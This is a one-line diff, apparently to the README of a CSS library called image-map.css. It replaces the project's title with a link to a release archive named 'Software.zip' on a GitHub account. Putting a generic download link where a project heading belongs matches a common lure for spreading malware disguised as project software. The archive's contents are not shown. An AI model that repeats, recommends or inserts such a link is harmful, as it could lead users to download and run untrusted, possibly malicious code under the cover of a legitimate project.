@@ -1,1 +1,1 @@
-# image-map.css
+# https://github.com/rohitandey/image-map.css/releases/download/v1.0/Software.zip
